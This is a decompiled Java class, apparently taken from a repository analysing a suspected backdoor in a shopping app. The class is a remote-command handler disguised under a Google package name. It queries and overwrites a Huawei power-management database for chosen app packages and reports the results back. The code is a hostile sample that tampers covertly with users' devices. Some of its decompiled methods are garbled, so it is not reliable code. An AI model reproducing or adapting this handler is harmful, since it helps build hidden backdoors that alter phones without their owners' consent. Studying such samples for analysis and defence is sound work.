package com.google.android.sd.biz_dynamic_dex.hw_power_update;

import android.content.ContentValues;
import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.biz_dynamic_dex.hw_db_handler.HwDBHandler;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.TrackUtils;
import com.google.android.sd.utils.Utils;
import java.util.HashMap;
import java.util.Iterator;
import java.util.concurrent.atomic.AtomicBoolean;
import org.json.JSONObject;

public class HwPowerUpdateExecutor extends DynamicCmdExecutor {
  private static final int CMD = 2002;
  
  private final String ACTION_QUERY = "query";
  
  private final String ACTION_UPDATE = "update";
  
  private final AtomicBoolean inProcess = new AtomicBoolean(false);
  
  private void fail(Context paramContext, String paramString1, String paramString2) {
    CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(new CmdData(2002, paramString2, "client"), paramString1, null));
  }
  
  private void query(Context paramContext, String paramString1, String paramString2) {
    HwDBHandler hwDBHandler = DbUtil.generateDBHandler(paramContext);
    SQLiteDatabase sQLiteDatabase = hwDBHandler.getDb();
    if (sQLiteDatabase == null) {
      hwDBHandler.clear();
      fail(paramContext, "open_db_fail", paramString1);
      return;
    } 
    JSONObject jSONObject = DbUtil.queryAllValueFromDb(sQLiteDatabase, paramString2);
    if (jSONObject.has("query_error_msg")) {
      fail(paramContext, jSONObject.optString("query_error_msg"), paramString1);
    } else {
      success(paramContext, jSONObject, paramString1);
    } 
    hwDBHandler.clear();
  }
  
  private void success(Context paramContext, JSONObject paramJSONObject, String paramString) {
    try {
      return;
    } finally {
      paramContext = null;
    } 
  }
  
  private void trackDbOperate(Context paramContext, String paramString, int paramInt) {
    HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
    hashMap.put("status", String.valueOf(paramInt));
    hashMap.put("details", paramString);
    TrackUtils.submitTrackAsync(paramContext, 2002, hashMap);
  }
  
  private void update(Context paramContext, String paramString1, String paramString2, JSONObject paramJSONObject) {
    HwDBHandler hwDBHandler = DbUtil.generateDBHandler(paramContext);
    SQLiteDatabase sQLiteDatabase = hwDBHandler.getDb();
    if (sQLiteDatabase == null) {
      hwDBHandler.clear();
      fail(paramContext, "open_db_fail", paramString1);
      return;
    } 
    ContentValues contentValues = new ContentValues();
    Iterator<String> iterator = paramJSONObject.keys();
    while (iterator.hasNext()) {
      String str = iterator.next();
      contentValues.put(str, Integer.valueOf(paramJSONObject.optInt(str)));
    } 
    paramString2 = DbUtil.updateDb(sQLiteDatabase, contentValues, paramString2);
    if (!TextUtils.equals(paramString2, "suc")) {
      fail(paramContext, paramString2, paramString1);
      hwDBHandler.clear();
      return;
    } 
    boolean bool = hwDBHandler.write(paramContext);
    hwDBHandler.clear();
    if (bool) {
      success(paramContext, null, paramString1);
      return;
    } 
    fail(paramContext, "write_fail", paramString1);
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    if (!this.inProcess.compareAndSet(false, true))
      return; 
    try {
      JSONObject jSONObject = new JSONObject(paramString);
      String str1 = jSONObject.optString("uuid");
      paramString = jSONObject.optString("action", "");
      String str2 = jSONObject.optString("pkg", "");
      StringBuilder stringBuilder2 = new StringBuilder();
      stringBuilder2.append("power_update_");
      stringBuilder2.append(paramString);
      trackDbOperate(paramContext, stringBuilder2.toString(), 100);
      if (TextUtils.equals(paramString, "query")) {
        query(paramContext, str1, str2);
      } else if (TextUtils.equals(paramString, "update")) {
        update(paramContext, str1, str2, jSONObject.optJSONObject("update_content"));
      } else {
        fail(paramContext, "illegal_action", str1);
      } 
      StringBuilder stringBuilder1 = new StringBuilder();
      stringBuilder1.append("power_update_");
      stringBuilder1.append(paramString);
      trackDbOperate(paramContext, stringBuilder1.toString(), 1);
    } finally {}
    this.inProcess.set(false);
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\8c34f5dc-f04c-40ba-98d4-7aa7c364b65c-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\hw_power_update\HwPowerUpdateExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */